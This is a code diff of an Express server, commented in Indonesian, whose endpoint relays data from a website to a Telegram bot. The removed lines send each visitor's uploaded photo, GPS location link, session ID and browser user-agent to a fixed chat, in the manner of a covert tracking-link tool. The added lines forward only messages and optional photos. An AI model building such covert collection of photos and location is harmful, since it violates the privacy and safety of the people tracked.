@@ -71,31 +71,28 @@ app.post("/bot-webhook", express.json(), async (req, res) => {
 // Endpoint untuk menerima data dari website
 app.post("/send-data", upload.single("photo"), async (req, res) => {
     try {
-        const { latitude, longitude } = req.body; // Lokasi
-        const session = req.query.session; // ID sesi
-        const userAgent = req.headers["user-agent"]; // User-Agent pengguna
+        const { message } = req.body;
 
-        const caption = `
-📍 **Data Pengguna:**
-- User-Agent: ${userAgent}
-- Lokasi: https://www.google.com/maps?q=${latitude},${longitude}
-- Sesi: ${session}
-        `;
+        // Jika ada pesan teks, kirimkan ke Telegram
+        if (message && message.trim() !== "") {
+            await sendTextMessage(CHAT_ID, message); // Mengirim pesan teks ke bot Telegram
+        }
 
-        // Kirim foto ke bot Telegram
-        const formData = new FormData();
-        formData.append("chat_id", CHAT_ID);
-        formData.append("photo", req.file.buffer, "photo.jpg");
-        formData.append("caption", caption);
+        if (req.file) {
+            // Kirim foto ke bot Telegram jika ada foto
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", req.file.buffer, "photo.jpg");
 
-        const response = await fetch(`${telegramApiUrl}sendPhoto`, {
-            method: "POST",
-            body: formData,
-        });
+            const response = await fetch(`${telegramApiUrl}sendPhoto`, {
+                method: "POST",
+                body: formData,
+            });
 
-        const data = await response.json();
-        if (!data.ok) {
-            throw new Error(`Gagal mengirim foto: ${data.description}`);
+            const data = await response.json();
+            if (!data.ok) {
+                throw new Error(`Gagal mengirim foto: ${data.description}`);
+            }
         }
 
         res.status(200).send("Data berhasil dikirim ke bot!");
